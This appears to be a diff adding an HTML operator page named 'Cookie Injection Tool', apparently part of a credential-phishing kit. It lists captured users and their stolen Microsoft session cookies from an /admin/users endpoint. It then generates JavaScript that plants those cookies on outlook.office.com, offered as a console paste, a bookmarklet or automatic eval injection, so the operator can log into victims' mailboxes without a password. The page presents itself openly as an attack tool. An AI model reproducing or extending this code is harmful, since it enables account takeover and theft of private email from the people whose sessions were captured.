@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Injector</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 { color: #0078d4; }
+        .step {
+            background: #f8f9fa;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 4px solid #0078d4;
+        }
+        button {
+            background: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+        }
+        button:hover { background: #106ebe; }
+        .code {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 15px;
+            border-radius: 4px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+        .success { color: #28a745; font-weight: bold; }
+        .error { color: #dc3545; font-weight: bold; }
+        select, input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🍪 Cookie Injection Tool</h1>
+        <p>Inject captured cookies to access accounts without authentication</p>
+
+        <div class="step">
+            <h3>Step 1: Select User</h3>
+            <select id="userSelect">
+                <option value="">Loading users...</option>
+            </select>
+            <div id="userInfo" style="margin-top: 10px;"></div>
+        </div>
+
+        <div class="step">
+            <h3>Step 2: Choose Injection Method</h3>
+            
+            <button onclick="injectViaConsole()">📋 Copy Console Script</button>
+            <button onclick="generateBookmarklet()">🔖 Generate Bookmarklet</button>
+            <button onclick="openWithCookies()">🚀 Open Outlook (Auto-Inject)</button>
+        </div>
+
+        <div class="step">
+            <h3>Step 3: Instructions</h3>
+            <div id="instructions"></div>
+        </div>
+
+        <div id="output" style="margin-top: 20px;"></div>
+    </div>
+
+    <script>
+        let users = [];
+        let selectedUser = null;
+
+        // Load users on page load
+        async function loadUsers() {
+            try {
+                const response = await fetch('/admin/users');
+                const data = await response.json();
+                users = data.users;
+                
+                const select = document.getElementById('userSelect');
+                select.innerHTML = '<option value="">-- Select a user --</option>';
+                
+                users.forEach((user, index) => {
+                    const option = document.createElement('option');
+                    option.value = index;
+                    option.textContent = `${user.email} (${user.cookieStatus}) - ${user.microsoftCookies?.length || 0} cookies`;
+                    select.appendChild(option);
+                });
+            } catch (error) {
+                document.getElementById('userSelect').innerHTML = '<option>Error loading users</option>';
+            }
+        }
+
+        // Handle user selection
+        document.getElementById('userSelect').addEventListener('change', (e) => {
+            const index = e.target.value;
+            if (index === '') {
+                selectedUser = null;
+                document.getElementById('userInfo').innerHTML = '';
+                return;
+            }
+            
+            selectedUser = users[index];
+            document.getElementById('userInfo').innerHTML = `
+                <strong>Email:</strong> ${selectedUser.email}<br>
+                <strong>Cookies:</strong> ${selectedUser.microsoftCookies?.length || 0}<br>
+                <strong>Status:</strong> ${selectedUser.cookieStatus}<br>
+                <strong>Last Login:</strong> ${new Date(selectedUser.lastLogin).toLocaleString()}
+            `;
+        });
+
+        // Method 1: Console Script
+        function injectViaConsole() {
+            if (!selectedUser) {
+                alert('Please select a user first');
+                return;
+            }
+
+            const script = generateInjectionScript(selectedUser.microsoftCookies);
+            
+            // Copy to clipboard
+            navigator.clipboard.writeText(script).then(() => {
+                document.getElementById('instructions').innerHTML = `
+                    <p class="success">✅ Script copied to clipboard!</p>
+                    <ol>
+                        <li>Open <a href="https://outlook.office.com" target="_blank">outlook.office.com</a> in a new tab</li>
+                        <li>Press <strong>F12</strong> to open Developer Console</li>
+                        <li>Click on the <strong>Console</strong> tab</li>
+                        <li>Paste the script and press <strong>Enter</strong></li>
+                        <li>Refresh the page (F5)</li>
+                        <li>You should be logged in!</li>
+                    </ol>
+                `;
+                
+                document.getElementById('output').innerHTML = `
+                    <div class="code">${escapeHtml(script)}</div>
+                `;
+            });
+        }
+
+        // Method 2: Bookmarklet
+        function generateBookmarklet() {
+            if (!selectedUser) {
+                alert('Please select a user first');
+                return;
+            }
+
+            const script = generateInjectionScript(selectedUser.microsoftCookies);
+            const bookmarklet = `javascript:(function(){${script};location.reload();})();`;
+            
+            document.getElementById('instructions').innerHTML = `
+                <p class="success">✅ Bookmarklet generated!</p>
+                <ol>
+                    <li>Drag the button below to your bookmarks bar</li>
+                    <li>Or right-click and "Bookmark this link"</li>
+                    <li>Go to <a href="https://outlook.office.com" target="_blank">outlook.office.com</a></li>
+                    <li>Click the bookmark</li>
+                    <li>You'll be logged in!</li>
+                </ol>
+                <p><a href="${bookmarklet}" style="background: #0078d4; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px;">📌 Inject Cookies for ${selectedUser.email}</a></p>
+            `;
+        }
+
+        // Method 3: Auto-inject and open
+        function openWithCookies() {
+            if (!selectedUser) {
+                alert('Please select a user first');
+                return;
+            }
+
+            const script = generateInjectionScript(selectedUser.microsoftCookies);
+            
+            // Open new window
+            const win = window.open('https://outlook.office.com', '_blank');
+            
+            // Wait for page to load, then inject
+            setTimeout(() => {
+                try {
+                    win.eval(script);
+                    win.location.reload();
+                    document.getElementById('instructions').innerHTML = `
+                        <p class="success">✅ Cookies injected! Check the new window.</p>
+                        <p>If it didn't work, the browser blocked the script. Use Method 1 or 2 instead.</p>
+                    `;
+                } catch (error) {
+                    document.getElementById('instructions').innerHTML = `
+                        <p class="error">❌ Auto-injection blocked by browser security.</p>
+                        <p>Please use Method 1 (Console Script) or Method 2 (Bookmarklet) instead.</p>
+                    `;
+                }
+            }, 2000);
+        }
+
+        // Generate injection script
+        function generateInjectionScript(cookies) {
+            if (!cookies || cookies.length === 0) {
+                return 'console.log("No cookies to inject");';
+            }
+
+            return `
+(function() {
+    let cookies = ${JSON.stringify(cookies)};
+    let injected = 0;
+    
+    cookies.forEach(cookie => {
+        try {
+            let cookieStr = cookie.name + '=' + cookie.value;
+            cookieStr += '; Max-Age=31536000';
+            cookieStr += '; path=' + (cookie.path || '/');
+            
+            if (cookie.domain && !cookie.domain.startsWith('.')) {
+                cookieStr += '; domain=.' + cookie.domain;
+            } else if (cookie.domain) {
+                cookieStr += '; domain=' + cookie.domain;
+            }
+            
+            if (cookie.secure) {
+                cookieStr += '; Secure';
+            }
+            
+            cookieStr += '; SameSite=None';
+            
+            document.cookie = cookieStr;
+            injected++;
+            console.log('✅ Injected:', cookie.name);
+        } catch (e) {
+            console.error('❌ Failed to inject:', cookie.name, e);
+        }
+    });
+    
+    console.log('🍪 Injected ' + injected + ' out of ' + cookies.length + ' cookies');
+    console.log('🔄 Refreshing page in 2 seconds...');
+    
+    setTimeout(() => location.reload(), 2000);
+})();
+            `.trim();
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Load users on page load
+        loadUsers();
+    </script>
+</body>
+</html>
